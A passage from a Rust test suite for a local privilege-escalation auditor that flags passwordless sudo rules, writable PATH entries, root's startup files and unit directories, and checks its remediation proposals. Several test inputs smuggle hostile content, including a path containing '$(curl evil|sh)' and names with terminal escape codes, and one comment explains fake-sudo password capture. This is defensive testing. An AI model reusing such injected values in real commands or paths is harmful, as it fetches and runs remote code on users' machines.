    assert_eq!(walk::resolve(&ctx, Path::new("/etc")), Some(p("/etc")));
    assert_eq!(walk::resolve(&ctx, Path::new("/absent")), None);
}

/// A host that answers some questions differently from the table it wraps, to
/// reach what a consistent host never does: a link that cannot be read, or one
/// that vanishes between two looks, an entry gone after its listing.
struct Scripted {
    inner: MemoryHost,
    link: Lookup<PathBuf>,
    list: Option<Lookup<Vec<OsString>>>,
    stat_missing: Option<PathBuf>,
}

impl Scripted {
    fn new(inner: MemoryHost) -> Self {
        Self {
            inner,
            link: Lookup::Missing,
            list: None,
            stat_missing: None,
        }
    }
}

impl HostView for Scripted {
    fn caller(&self) -> Caller {
        self.inner.caller()
    }
    fn stat(&self, path: &Path) -> Lookup<Meta> {
        if self.stat_missing.as_deref() == Some(path) {
            return Lookup::Missing;
        }
        self.inner.stat(path)
    }
    fn read(&self, path: &Path) -> Lookup<Vec<u8>> {
        self.inner.read(path)
    }
    fn list(&self, path: &Path) -> Lookup<Vec<OsString>> {
        self.list.clone().unwrap_or_else(|| self.inner.list(path))
    }
    fn read_link(&self, _path: &Path) -> Lookup<PathBuf> {
        self.link.clone()
    }
    fn writable(&self, path: &Path) -> bool {
        self.inner.writable(path)
    }
}

#[test]
fn a_link_that_cannot_be_read_or_has_gone_is_unverified() {
    let mut host = Scripted::new(clean().link("/etc/l", "/usr"));
    let examined = |host: &Scripted| {
        let ctx = Ctx::new(host);
        walk::examine(&ctx, Path::new("/etc/l"))
    };
    assert_eq!(
        examined(&host),
        Outcome::Unverified(gap(
            "/etc/l",
            "/etc/l",
            "it changed while it was being examined"
        ))
    );
    host.link = Lookup::Unreadable("EIO".to_owned());
    assert_eq!(
        examined(&host),
        Outcome::Unverified(gap("/etc/l", "/etc/l", "EIO"))
    );
}

#[test]
fn a_directory_that_changes_while_it_is_read_is_unverified_or_skipped() {
    // Listed, then gone; or listed with an entry that has gone by the time it
    // is examined. Neither is a finding and neither is said: what is no longer
    // there is not a path to root, and a failure to read it (as opposed to its
    // absence) is what is reported as unverified.
    let base =
        clean()
            .dir("/etc/profile.d", 0, 0, 0o755)
            .file("/etc/profile.d/a.sh", 0, 0, 0o644, b"");
    let mut host = Scripted::new(base.clone());
    host.list = Some(Lookup::Missing);
    let report = run(&host, "/usr/bin");
    assert_eq!(
        check(&report, CheckId::RootShellStartup).status,
        Status::Clean
    );

    let mut host = Scripted::new(base);
    host.stat_missing = Some(p("/etc/profile.d/a.sh"));
    let report = run(&host, "/usr/bin");
    let startup = check(&report, CheckId::RootShellStartup);
    assert_eq!(startup.status, Status::Clean);
    assert_eq!(startup.unverified, Vec::new());
}

// --- root's PATH, the user's PATH, and root's shells -----------------------

#[test]
fn root_path_reads_secure_path_and_the_stock_list_once_each() {
    let host = clean()
        .file(
            "/etc/sudoers",
            0,
            0,
            0o440,
            b"Defaults secure_path=\"/opt/bin:/usr/bin\"\n",
        )
        .dir("/opt", 0, 0, 0o755)
        .dir("/opt/bin", 0, 4, 0o775)
        .file("/usr/bin/evil", 0, 0, 0o777, b"")
        .link("/bin", "/usr/bin");
    let report = run(&host, "/usr/bin");
    let root_path = check(&report, CheckId::RootPath);
    // /usr/bin is reached three ways and its entries are read once.
    assert_eq!(
        root_path
            .findings
            .iter()
            .map(writable_at)
            .collect::<Vec<_>>(),
        vec![
            Some(("/opt/bin".to_owned(), "/opt/bin".to_owned(), Via::Itself)),
            Some((
                "/usr/bin/evil".to_owned(),
                "/usr/bin/evil".to_owned(),
                Via::Itself
            )),
        ]
    );
}

#[test]
fn a_root_path_with_no_sudoers_names_the_stock_directories() {
    let report = run(&clean(), "/usr/bin");
    let root_path = check(&report, CheckId::RootPath);
    assert_eq!(
        root_path.note.as_deref(),
        Some("the stock secure_path directories; there is no /etc/sudoers")
    );
}

#[test]
fn denies_a_writable_entry_ahead_of_sudo_capturing_the_password() {
    // The classic: an agent puts a program named sudo in a directory of yours
    // that comes before /usr/bin, and the next sudo you type hands it your
    // password. A relative entry ahead is the same, from whatever directory
    // you are in; anything behind /usr/bin is never reached by that name.
    let host = clean()
        .dir("/home/yamin/.local", ME, ME, 0o755)
        .dir("/home/yamin/.local/bin", ME, ME, 0o755)
        .dir("/home/yamin/bin", ME, ME, 0o755)
        .sealed_dir("/sealed", 0, 0, 0o700);
    let report = run(
        &host,
        "/home/yamin/.local/bin::/sealed/x:/home/yamin/.local/bin:/usr/sbin:/usr/bin:/home/yamin/bin:.",
    );
    let path = check(&report, CheckId::UserPath);
    assert_eq!(path.findings.len(), 2, "{:?}", path.findings);
    // The outermost component anyone else can write is the one named: yamin's
    // home, from which all of .local/bin can be replaced.
    assert_eq!(
        path.findings[0],
        Finding::Writable {
            path: p("/home/yamin/.local/bin"),
            at: p("/home/yamin"),
            via: Via::Ancestor,
            writers: vec![Writer::Owner {
                uid: ME,
                name: Some("yamin".to_owned()),
                you: true
            }],
            shadows: Some("/usr/bin/sudo".to_owned()),
        }
    );
    assert_eq!(
        path.findings[1],
        Finding::RelativePathEntry {
            entry: PathBuf::new()
        }
    );
    assert_eq!(path.unverified.len(), 1);
    // The repeated entry was examined once; /usr/sbin, clean, was examined.
    assert_eq!(path.examined, 3);
    assert_eq!(
        path.note.as_deref(),
        Some(
            "the entries from /usr/bin on (3) were not examined: nothing there is found \
             before /usr/bin/sudo"
        )
    );
}

#[test]
fn with_the_backend_off_path_or_unknown_every_entry_is_ahead() {
    let host = clean().dir("/home/yamin/bin", ME, ME, 0o755);
    let off_path = assess(&host, &input("/home/yamin/bin"));
    let finding = &check(&off_path, CheckId::UserPath).findings[0];
    assert_eq!(
        writable_at(finding).map(|(_, at, _)| at),
        Some("/home/yamin".to_owned())
    );
    assert_eq!(check(&off_path, CheckId::UserPath).note, None);

    let unknown = assess(
        &host,
        &Input {
            user_path: Some(OsStr::new("/home/yamin/bin:/usr/bin")),
            backend_exe: None,
        },
    );
    let path = check(&unknown, CheckId::UserPath);
    assert_eq!(
        path.findings[0],
        Finding::Writable {
            path: p("/home/yamin/bin"),
            at: p("/home/yamin"),
            via: Via::Ancestor,
            writers: vec![Writer::Owner {
                uid: ME,
                name: Some("yamin".to_owned()),
                you: true
            }],
            shadows: Some("/usr/bin".to_owned()),
        }
    );
    assert_eq!(
        path.note.as_deref(),
        Some(
            "the entries from /usr/bin on (1) were not examined: nothing there is found \
             before /usr/bin"
        )
    );

    // A backend whose own directory does not resolve leaves nothing to stand
    // behind, so every entry is ahead.
    let gone = assess(
        &host,
        &Input {
            user_path: Some(OsStr::new("/home/yamin/bin:/usr/bin")),
            backend_exe: Some(Path::new("/opt/gone/sudo")),
        },
    );
    assert_eq!(check(&gone, CheckId::UserPath).examined, 2);

    let none = assess(&host, &Input::default());
    let path = check(&none, CheckId::UserPath);
    assert_eq!(path.status, Status::Unverified);
    assert!(path.unverified[0].reason.contains("not provided"));
}

#[test]
fn roots_shell_startup_files_are_found_or_said_to_be_out_of_sight() {
    let host = clean()
        .sealed_dir("/root", 0, 0, 0o700)
        .file("/etc/environment", 0, 0, 0o666, b"")
        .dir("/etc/profile.d", 0, 0, 0o755)
        .file("/etc/profile.d/evil.sh", ALICE, ALICE, 0o644, b"");
    let report = run(&host, "/usr/bin");
    let startup = check(&report, CheckId::RootShellStartup);
    assert_eq!(
        startup.findings.iter().map(writable_at).collect::<Vec<_>>(),
        vec![
            Some((
                "/etc/environment".to_owned(),
                "/etc/environment".to_owned(),
                Via::Itself
            )),
            Some((
                "/etc/profile.d/evil.sh".to_owned(),
                "/etc/profile.d/evil.sh".to_owned(),
                Via::Itself
            )),
        ]
    );
    // Every file in /root is out of sight to an unprivileged caller, and that
    // is said once, for /root, naming each file.
    assert_eq!(startup.unverified.len(), 1, "{:?}", startup.unverified);
    assert_eq!(startup.unverified[0].path, p("/root"));
    assert!(
        startup.unverified[0]
            .reason
            .starts_with("Permission denied")
    );
    assert!(startup.unverified[0].reason.contains(".bashrc"));
    assert_eq!(startup.note, None);
    // Each file, then /etc/profile.d and its one entry, then the absent
    // /etc/fish/conf.d.
    assert_eq!(
        startup.examined,
        SYSTEM_STARTUP_FILES.len() + ROOT_HOME_FILES.len() + 3
    );

    // Root's home comes from /etc/passwd when it says otherwise, and a home
    // that can be read is examined file by file.
    let elsewhere = clean()
        .file(
            "/etc/passwd",
            0,
            0,
            0o644,
            b"root:x:0:0::/var/root:/bin/sh\n",
        )
        .dir("/var", 0, 0, 0o755)
        .dir("/var/root", 0, 0, 0o755)
        .file("/var/root/.profile", 0, 0, 0o646, b"")
        .fault("/var/root/.bashrc", "EIO");
    let report = run(&elsewhere, "/usr/bin");
    let startup = check(&report, CheckId::RootShellStartup);
    assert_eq!(
        writable_at(&startup.findings[0]).map(|(path, _, _)| path),
        Some("/var/root/.profile".to_owned())
    );
    assert_eq!(
        startup.unverified,
        vec![gap("/var/root/.bashrc", "/var/root/.bashrc", "EIO")]
    );
}

// --- the data model --------------------------------------------------------

#[test]
fn the_report_serializes_with_stable_snake_case_names() {
    let report = run(
        &units_host().file("/etc/sudoers", 0, 0, 0o440, b"ALL ALL=NOPASSWD: ALL\n"),
        ":/usr/bin",
    );
    let json: serde_json::Value = serde_json::to_value(&report).unwrap();
    assert_eq!(json["status"], "found");
    assert_eq!(json["checks"][0]["check"], "passwordless_rules");
    assert_eq!(
        json["checks"][0]["findings"][0]["kind"],
        "passwordless_rule"
    );
    assert_eq!(json["checks"][0]["findings"][0]["grant"], "nopasswd");
    assert_eq!(json["checks"][0]["findings"][0]["applies_to_you"], "yes");
    assert_eq!(json["checks"][0]["findings"][0]["file"], "/etc/sudoers");
    assert_eq!(json["checks"][2]["check"], "unit_directories");
    assert_eq!(json["checks"][2]["findings"][0]["via"], "itself");
    assert_eq!(
        json["checks"][2]["findings"][0]["writers"][0]["kind"],
        "group"
    );
    assert_eq!(
        json["checks"][2]["unverified"][0]["at"],
        "/usr/lib/systemd/system/gone.service"
    );
    assert_eq!(
        json["checks"][4]["findings"][0]["kind"],
        "relative_path_entry"
    );
    assert_eq!(json["checks"][4]["findings"][0]["entry"], "");
    assert_eq!(json["subject"]["name"], "yamin");
    assert_eq!(json["aido_group"]["gid"], 998);
    let names: Vec<serde_json::Value> = [
        Status::Skipped,
        Status::Clean,
        Status::Unverified,
        Status::Found,
    ]
    .iter()
    .map(|s| serde_json::to_value(s).unwrap())
    .collect();
    assert_eq!(names, ["skipped", "clean", "unverified", "found"]);
    let writers: Vec<serde_json::Value> = [
        Writer::You,
        Writer::Everyone,
        Writer::Owner {
            uid: 1,
            name: None,
            you: false,
        },
    ]
    .iter()
    .map(|w| serde_json::to_value(w).unwrap()["kind"].clone())
    .collect();
    assert_eq!(writers, ["you", "everyone", "owner"]);
    for (value, wire) in [
        (serde_json::to_value(Via::Ancestor).unwrap(), "ancestor"),
        (serde_json::to_value(Via::Missing).unwrap(), "missing"),
        (serde_json::to_value(Applies::Maybe).unwrap(), "maybe"),
        (serde_json::to_value(Applies::No).unwrap(), "no"),
        (
            serde_json::to_value(Grant::NoAuthenticate).unwrap(),
            "no_authenticate",
        ),
        (serde_json::to_value(Grant::Nopass).unwrap(), "nopass"),
        (
            serde_json::to_value(CheckId::GroupMemberships).unwrap(),
            "group_memberships",
        ),
        (
            serde_json::to_value(CheckId::RootPath).unwrap(),
            "root_path",
        ),
        (
            serde_json::to_value(CheckId::UserPath).unwrap(),
            "user_path",
        ),
        (
            serde_json::to_value(CheckId::RootShellStartup).unwrap(),
            "root_shell_startup",
        ),
    ] {
        assert_eq!(value, wire);
    }
    let membership = serde_json::to_value(Finding::GroupMembership {
        group: "docker".to_owned(),
        gid: 999,
        passwordless: true,
        grants: "x".to_owned(),
        listed: true,
        active: false,
    })
    .unwrap();
    assert_eq!(membership["kind"], "group_membership");
    assert!(format!("{:?}", report.clone()).contains("UnitDirectories"));
}

#[test]
fn a_lookup_maps_only_what_it_found() {
    assert_eq!(Lookup::Found(2).map(|n| n * 2), Lookup::Found(4));
    assert_eq!(Lookup::<u8>::Missing.map(|n| n * 2), Lookup::Missing);
    assert_eq!(
        Lookup::<u8>::Unreadable("x".to_owned()).map(|n| n * 2),
        Lookup::Unreadable("x".to_owned())
    );
}

#[test]
fn every_writer_says_whether_it_includes_you() {
    let named = Writer::Group {
        gid: 1,
        name: None,
        you: false,
    };
    assert!(Writer::You.includes_you());
    assert!(Writer::Everyone.includes_you());
    assert!(!named.includes_you());
    assert!(
        Writer::Owner {
            uid: 1,
            name: None,
            you: true
        }
        .includes_you()
    );
    assert!(format!("{named:?}").contains("Group"));
    assert!(format!("{:?}", Input::default()).contains("Input"));
}

// --- the fake itself -------------------------------------------------------

#[test]
fn the_described_machine_answers_like_the_kernel() {
    let host = clean()
        .unreadable_file("/etc/shadow", 0, 42, 0o640)
        .special("/etc/fifo", 0, 0, 0o644)
        .unlistable_dir("/srv", 0, 0, 0o711)
        .file("/srv/known", 0, 0, 0o644, b"x")
        .acl_writable("/srv/known")
        .link("/srv/up", "../etc/passwd")
        .link("/srv/abs", "/srv/known");
    let p = Path::new;
    assert_eq!(
        host.read(p("/etc")),
        Lookup::Unreadable(NOT_A_REGULAR_FILE.to_owned())
    );
    assert_eq!(
        host.read(p("/etc/fifo")),
        Lookup::Unreadable(NOT_A_REGULAR_FILE.to_owned())
    );
    assert_eq!(
        host.read(p("/etc/shadow")),
        Lookup::Unreadable("Permission denied (os error 13)".to_owned())
    );
    assert_eq!(host.read(p("/srv/known")), Lookup::Found(b"x".to_vec()));
    // A relative target is followed from the link's own directory, `..` and
    // all, and an absolute one from /.
    assert_eq!(host.read(p("/srv/up")), Lookup::Found(PASSWD.to_vec()));
    assert_eq!(host.read(p("/srv/abs")), Lookup::Found(b"x".to_vec()));
    assert_eq!(
        host.read_link(p("/srv/up")),
        Lookup::Found(PathBuf::from("../etc/passwd"))
    );
    assert_eq!(
        host.read_link(p("/srv/known")),
        Lookup::Unreadable("Invalid argument (os error 22)".to_owned())
    );
    assert_eq!(host.read_link(p("/srv/absent")), Lookup::Missing);
    assert_eq!(
        host.stat(p("/srv/up")).map(|m| m.kind),
        Lookup::Found(Kind::Symlink)
    );
    assert_eq!(
        host.stat(p("/etc/fifo")).map(|m| m.kind),
        Lookup::Found(Kind::Other)
    );
    // A file where a directory must be: missing, as ENOTDIR is reported.
    assert_eq!(host.stat(p("/etc/passwd/x")), Lookup::Missing);
    assert_eq!(host.list(p("/etc/passwd")), Lookup::Missing);
    assert_eq!(
        host.list(p("/srv")),
        Lookup::Unreadable("Permission denied (os error 13)".to_owned())
    );
    assert!(host.writable(p("/srv/known")));
    assert!(host.writable(p("/srv/abs")));
    assert!(!host.writable(p("/srv/absent")));
    assert_eq!(host.list(p("/absent")), Lookup::Missing);
    let sealed = clean().sealed_dir("/s", 0, 0, 0o700);
    assert_eq!(
        sealed.stat(p("/s/x")),
        Lookup::Unreadable("Permission denied (os error 13)".to_owned())
    );
    let looping = clean().link("/a", "b").link("/b", "/a");
    assert_eq!(
        looping.read(p("/a")),
        Lookup::Unreadable("Too many levels of symbolic links (os error 40)".to_owned())
    );

    let faulty = MemoryHost::new(caller(&[])).fault("/", "EIO");
    assert_eq!(faulty.stat(p("/")), Lookup::Unreadable("EIO".to_owned()));
    assert_eq!(
        faulty.list(p("/")),
        Lookup::Unreadable("Permission denied (os error 13)".to_owned())
    );
    assert_eq!(faulty.stat(p("/x")), Lookup::Missing);
    let names = clean().list(p("/usr")).map(|names| {
        names
            .iter()
            .map(|name| name.as_bytes().to_vec())
            .collect::<Vec<_>>()
    });
    assert_eq!(
        names,
        Lookup::Found(vec![b"bin".to_vec(), b"sbin".to_vec()])
    );
    assert_eq!(clean(), clean());
    assert!(format!("{:?}", clean()).contains("MemoryHost"));
}

#[test]
fn listing_names_survive_as_bytes() {
    let host = clean().file("/etc/\u{e9}t\u{e9}", 0, 0, 0o644, b"");
    let names = host.list(Path::new("/etc")).map(|names| {
        names
            .iter()
            .any(|n| n.as_bytes() == "\u{e9}t\u{e9}".as_bytes())
    });
    assert_eq!(names, Lookup::Found(true));
}

// --- proposals -------------------------------------------------------------

fn ids(proposals: &[Proposal]) -> Vec<&str> {
    proposals.iter().map(|p| p.id.as_str()).collect()
}

#[test]
fn joining_the_aido_group_is_offered_with_the_exact_command() {
    let host = clean();
    let report = run(&host, "/usr/bin");
    let proposals = propose(&host, &report, Some("/usr/bin/sudo"));
    assert_eq!(ids(&proposals), vec!["join-aido"]);
    assert_eq!(
        proposals[0].commands,
        vec![vec![
            "/usr/bin/sudo",
            "/usr/sbin/usermod",
            "--append",
            "--groups",
            "aido",
            "yamin"
        ]]
    );
    assert!(proposals[0].needs_root);
    assert!(
        proposals[0]
            .means
            .contains("asks for your password: this release installs no rule")
    );
    assert!(proposals[0].means.contains("caches a credential"));
    assert_eq!(proposals[0].by_hand, None);
}

#[test]
fn joining_falls_back_to_busybox_then_to_by_hand() {
    let busybox = clean()
        .fault("/usr/sbin/usermod", "gone")
        .link("/usr/sbin/addgroup", "/bin/busybox");
    let report = run(&busybox, "/usr/bin");
    let proposals = propose(&busybox, &report, None);
    assert_eq!(
        proposals[0].commands,
        vec![vec!["/usr/sbin/addgroup", "yamin", "aido"]]
    );
    let bare = clean().fault("/usr/sbin/usermod", "gone");
    let report = run(&bare, "/usr/bin");
    let proposals = propose(&bare, &report, None);
    assert!(proposals[0].commands.is_empty());
    assert!(
        proposals[0]
            .by_hand
            .as_deref()
            .unwrap()
            .contains("account tool")
    );
}

#[test]
fn joining_is_not_offered_to_a_member_to_root_or_without_the_group() {
    let member = clean().file("/etc/group", 0, 0, 0o644, b"aido:x:998:yamin\n");
    let report = run(&member, "/usr/bin");
    assert!(report.aido_group.member);
    assert!(propose(&member, &report, None).is_empty());

    let absent = clean().file("/etc/group", 0, 0, 0o644, b"yamin:x:1000:\n");
    let report = run(&absent, "/usr/bin");
    assert!(!report.aido_group.exists);
    assert!(propose(&absent, &report, None).is_empty());

    let root = clean_for(Caller {
        uid: 0,
        gid: 0,
        groups: Lookup::Found(vec![]),
    });
    let report = run(&root, "/usr/bin");
    assert!(propose(&root, &report, None).is_empty());

    let nameless = clean().file("/etc/passwd", 0, 0, 0o644, b"");
    let report = run(&nameless, "/usr/bin");
    let proposals = propose(&nameless, &report, None);
    assert!(
        proposals[0]
            .by_hand
            .as_deref()
            .unwrap()
            .contains("directory service")
    );
}

#[test]
fn denies_a_command_built_from_a_name_a_shell_would_reinterpret() {
    // A name in /etc/passwd is root's to write, but it is still not printed
    // into a command unless every byte of it survives a paste.
    let host = clean()
        .file(
            "/etc/passwd",
            0,
            0,
            0o644,
            b"root:x:0:0::/root:/bin/sh\nya\x1b[2Jmin:x:1000:1000::/home/y:/bin/sh\n",
        )
        .file(
            "/etc/group",
            0,
            0,
            0o644,
            b"aido:x:998:\ndocker:x:999:ya\x1b[2Jmin\n",
        );
    let report = run(&host, "/usr/bin");
    let proposals = propose(&host, &report, Some("/usr/bin/sudo"));
    assert_eq!(ids(&proposals), vec!["join-aido", "leave-docker"]);
    assert!(
        proposals
            .iter()
            .all(|p| p.commands.is_empty() && p.by_hand.is_some())
    );
}

#[test]
fn leaving_a_root_equivalent_group_is_offered_and_sudo_is_not() {
    let host = clean_for(caller(&[ME, 997]))
        .file(
            "/etc/group",
            0,
            0,
            0o644,
            b"sudo:x:27:yamin\ndocker:x:999:yamin\nlxd:x:997:\naido:x:998:yamin\n",
        )
        .dir("/usr/bin/gpasswd", 0, 0, 0o755)
        .dir("/bin", 0, 0, 0o755)
        .file("/bin/gpasswd", 0, 0, 0o755, b"");
    let report = run(&host, "/usr/bin");
    let proposals = propose(&host, &report, Some("/usr/bin/doas"));
    assert_eq!(ids(&proposals), vec!["leave-docker", "leave-lxd"]);
    // A directory at the first candidate is not the tool.
    assert_eq!(
        proposals[0].commands,
        vec![vec![
            "/usr/bin/doas",
            "/bin/gpasswd",
            "--delete",
            "yamin",
            "docker"
        ]]
    );
    assert!(proposals[0].means.contains("Rootless Docker"));
    // Held but not listed: there is no line in /etc/group to remove.
    assert!(proposals[1].commands.is_empty());
    assert!(
        proposals[1]
            .by_hand
            .as_deref()
            .unwrap()
            .contains("directory service")
    );

    let busybox =
        host.clone()
            .fault("/bin/gpasswd", "gone")
            .file("/usr/sbin/delgroup", 0, 0, 0o755, b"");
    let report = run(&busybox, "/usr/bin");
    assert_eq!(
        propose(&busybox, &report, None)[0].commands,
        vec![vec!["/usr/sbin/delgroup", "yamin", "docker"]]
    );
    let bare = host.fault("/bin/gpasswd", "gone");
    let report = run(&bare, "/usr/bin");
    assert!(propose(&bare, &report, None)[0].by_hand.is_some());
}

#[test]
fn passwordless_rules_are_offered_for_review_never_edited() {
    let host = clean()
        .file(
            "/etc/sudoers",
            0,
            0,
            0o440,
            b"yamin ALL=NOPASSWD: ALL\nalice ALL=NOPASSWD: ALL\n#include /etc/sudoers.local\n",
        )
        .file(
            "/etc/sudoers.local",
            0,
            0,
            0o440,
            b"Defaults !authenticate\n",
        )
        .file("/etc/doas.conf", 0, 0, 0o400, b"permit nopass yamin\n")
        .file("/usr/sbin/visudo", 0, 0, 0o755, b"");
    let report = run(&host, "/usr/bin");
    let proposals = propose(&host, &report, Some("/usr/bin/sudo"));
    let review: Vec<&Proposal> = proposals
        .iter()
        .filter(|p| p.id.starts_with("review"))
        .collect();
    assert_eq!(
        review.iter().map(|p| p.id.as_str()).collect::<Vec<_>>(),
        vec!["review-sudoers-1", "review-sudoers-2", "review-doas-1"]
    );
    assert_eq!(
        review[0].commands,
        vec![vec![
            "/usr/bin/sudo",
            "/usr/sbin/visudo",
            "-f",
            "/etc/sudoers"
        ]]
    );
    assert!(review[0].means.contains("line(s) 1, 2"));
    assert!(review[2].commands.is_empty());
    assert!(review[2].by_hand.as_deref().unwrap().contains("doas -C"));

    // Without visudo, the review is by hand.
    let bare = host.fault("/usr/sbin/visudo", "gone");
    let report = run(&bare, "/usr/bin");
    let proposals = propose(&bare, &report, None);
    assert!(
        proposals
            .iter()
            .find(|p| p.id == "review-sudoers-1")
            .unwrap()
            .by_hand
            .is_some()
    );
}

#[test]
fn the_proposal_for_an_unread_include_does_not_ask_to_remove_a_tag() {
    // A line that holds only an include aido could not check has no tag to
    // remove: the proposal asks for a rewrite on one physical line. Where the
    // file holds a tag as well, it asks for both. Each is checked with visudo
    // present (the `means` text) and absent (the by-hand text).
    let visudo = |text: &[u8]| sudoers(text).file("/usr/sbin/visudo", 0, 0, 0o755, b"");
    let review = |host: &MemoryHost, tool: Option<&str>| {
        let report = run(host, "/usr/bin");
        let proposals = propose(host, &report, tool);
        proposals
            .into_iter()
            .find(|p| p.id == "review-sudoers-1")
            .unwrap()
    };
    let only = visudo(b"@include \"/etc/q\\\nr\"\n");
    let found = review(&only, Some("/usr/bin/sudo"));
    assert!(
        found.means.contains("rewrite the include on line(s) 1"),
        "{}",
        found.means
    );
    assert!(!found.means.contains("NOPASSWD"), "{}", found.means);
    assert!(!found.means.contains("!authenticate"), "{}", found.means);
    let by_hand = review(&only.fault("/usr/sbin/visudo", "gone"), None)
        .by_hand
        .unwrap();
    assert!(
        by_hand.contains("rewrite the include on line(s) 1"),
        "{by_hand}"
    );
    assert!(!by_hand.contains("NOPASSWD"), "{by_hand}");

    let both = visudo(b"yamin ALL=NOPASSWD: ALL\n@include \"/etc/q\\\nr\"\n");
    let found = review(&both, Some("/usr/bin/sudo"));
    assert!(
        found.means.contains(
            "remove NOPASSWD or !authenticate from line(s) 1, and rewrite the include on line(s) 2"
        ),
        "{}",
        found.means
    );
    let by_hand = review(&both.fault("/usr/sbin/visudo", "gone"), None)
        .by_hand
        .unwrap();
    assert!(
        by_hand.contains("remove NOPASSWD from line(s) 1, and rewrite the include on line(s) 2"),
        "{by_hand}"
    );
}

#[test]
fn a_writable_path_root_trusts_is_offered_back_to_root() {
    let host = units_host()
        .file("/usr/bin/chmod", 0, 0, 0o755, b"")
        .file("/usr/bin/chown", 0, 0, 0o755, b"")
        .dir("/home/yamin/bin", ME, ME, 0o755)
        .dir("/opt", 0, 0, 0o755)
        .dir("/opt/shared", ALICE, 4, 0o775);
    let report = run(&host, "/home/yamin/bin:x:/opt/shared");
    let proposals = propose(&host, &report, Some("/usr/bin/sudo"));
    let by_id = |id: &str| proposals.iter().find(|p| p.id == id).unwrap();
    assert_eq!(
        by_id("protect-1").commands,
        vec![vec![
            "/usr/bin/sudo",
            "/usr/bin/chmod",
            "go-w",
            "/etc/systemd/system"
        ]]
    );
    assert!(
        by_id("protect-1").means.contains("The group adm (4)"),
        "{}",
        by_id("protect-1").means
    );
    assert_eq!(
        by_id("protect-2").commands,
        vec![vec![
            "/usr/bin/sudo",
            "/usr/bin/chown",
            "root",
            "/run/systemd/system"
        ]]
    );
    // The ACL case has no mode to change.
    assert!(
        by_id("protect-3")
            .by_hand
            .as_deref()
            .unwrap()
            .contains("getfacl")
    );
    assert!(by_id("protect-3").means.starts_with("Only root"));
    // A linked unit under yamin's home: root runs what is in it, but the home
    // directory is not handed to root, which would lock the account out of it.
    // The unit is moved out of it instead.
    let home = proposals
        .iter()
        .find(|p| p.title.contains("out of /home/yamin"))
        .unwrap();
    assert!(home.commands.is_empty(), "{home:?}");
    assert!(home.needs_root);
    assert!(
        home.by_hand
            .as_deref()
            .unwrap()
            .contains("Do not change who owns /home/yamin"),
        "{home:?}"
    );
    assert!(
        home.means.contains("Its owner, yamin (1000)"),
        "{}",
        home.means
    );
    assert!(
        !proposals
            .iter()
            .flat_map(|p| p.commands.iter().flatten())
            .any(|word| word == "/home/yamin" || word == "/opt/shared"),
        "{proposals:?}"
    );
    // A PATH entry is taken off the PATH, whoever owns it, never handed to
    // root: yours, someone else's, and the relative one.
    let fixes: Vec<&Proposal> = proposals
        .iter()
        .filter(|p| p.id.starts_with("fix-path"))
        .collect();
    assert_eq!(fixes.len(), 3);
    assert!(fixes.iter().all(|p| !p.needs_root && p.commands.is_empty()));
    assert!(fixes[0].means.contains("comes before /usr/bin/sudo"));
    assert!(fixes[0].title.contains("or move it later"));
    assert!(fixes[1].title.contains("relative"));
    assert_eq!(fixes[2].title, "take /opt/shared off your PATH");
    assert!(
        fixes[2]
            .means
            .starts_with("Its owner, alice (1001) and the group adm (4) can put a program"),
        "{}",
        fixes[2].means
    );
}

#[test]
fn a_file_or_directory_owned_and_shared_gets_both_commands_and_a_warning_about_its_contents() {
    let host = units_host()
        .file("/usr/bin/chmod", 0, 0, 0o755, b"")
        .file("/usr/bin/chown", 0, 0, 0o755, b"")
        .dir("/run/systemd/system.attached", ALICE, 4, 0o775);
    let report = run(&host, "/usr/bin");
    let proposals = propose(&host, &report, Some("/usr/bin/sudo"));
    let attached = proposals
        .iter()
        .find(|p| p.title.contains("/run/systemd/system.attached"))
        .unwrap();
    assert_eq!(attached.commands.len(), 2);
    assert!(
        attached.means.contains("review that too"),
        "{}",
        attached.means
    );
    let unit = proposals
        .iter()
        .find(|p| p.title.contains("b.service"))
        .unwrap();
    assert!(
        unit.means.contains("inspect them, or reinstall the file"),
        "{}",
        unit.means
    );
}

#[test]
fn denies_handing_a_shared_directory_or_the_filesystem_root_to_root() {
    // `/tmp` is sticky and shared, and a PATH entry under it is no reason to
    // `chmod go-w /tmp` or `chown root /tmp`; a unit root runs from a
    // world-writable `/` is no reason to chown that either.
    let at = |dir: &str, path: &str| Finding::Writable {
        path: p(path),
        at: p(dir),
        via: Via::Missing,
        writers: vec![Writer::Everyone],
        shadows: None,
    };
    let host = units_host()
        .file("/usr/bin/chmod", 0, 0, 0o755, b"")
        .file("/usr/bin/chown", 0, 0, 0o755, b"")
        .dir("/tmp", 0, 0, 0o1777);
    let mut report = run(&host, "/usr/bin");
    let rooted = Check {
        check: CheckId::RootPath,
        status: Status::Found,
        examined: 2,
        findings: vec![at("/tmp", "/tmp/bin"), at("/", "/sbin")],
        unverified: Vec::new(),
        note: None,
    };
    report.checks.retain(|c| c.check != CheckId::RootPath);
    report.checks.push(rooted);
    let proposals = propose(&host, &report, Some("/usr/bin/sudo"));
    for dir in ["/tmp", "/"] {
        assert!(
            proposals
                .iter()
                .filter(|p| p.title.contains(&format!("out of {dir}")))
                .all(|p| p.commands.is_empty() && p.by_hand.is_some()),
            "{dir}: {proposals:?}"
        );
        assert!(
            proposals
                .iter()
                .any(|p| p.title.contains(&format!("out of {dir}"))),
            "{dir}"
        );
    }
    assert!(
        !proposals
            .iter()
            .flat_map(|p| p.commands.iter().flatten())
            .any(|word| word == "/tmp" || word == "/"),
        "{proposals:?}"
    );
}

#[test]
fn a_command_that_cannot_be_printed_exactly_becomes_by_hand() {
    // No chown on the host, no chmod on another, and paths that are not
    // printable ASCII: none may be turned into a command that names something
    // else, or one a paste would reinterpret.
    let host = units_host().file("/usr/bin/chmod", 0, 0, 0o755, b"");
    let report = run(&host, "/usr/bin");
    let proposals = propose(&host, &report, None);
    let owner = proposals
        .iter()
        .find(|p| p.title.contains("/run/systemd/system"))
        .unwrap();
    assert!(owner.commands.is_empty());
    assert!(owner.by_hand.is_some());
    let no_chmod = units_host().file("/usr/bin/chown", 0, 0, 0o755, b"");
    let report = run(&no_chmod, "/usr/bin");
    let shared = propose(&no_chmod, &report, None)
        .into_iter()
        .find(|p| p.title.contains("/etc/systemd/system "))
        .unwrap();
    assert!(shared.commands.is_empty());
    assert!(shared.by_hand.as_deref().unwrap().contains("As root"));

    let odd = Path::new(OsStr::from_bytes(b"/etc/sudoers.d/\xff"));
    let injected = Path::new("/usr/lib/systemd/$(curl evil|sh)\x1b[8m");
    let report = Report {
        subject: report.subject.clone(),
        status: Status::Found,
        aido_group: AidoGroup {
            exists: false,
            gid: None,
            member: false,
        },
        checks: vec![
            Check {
                check: CheckId::PasswordlessRules,
                status: Status::Found,
                examined: 1,
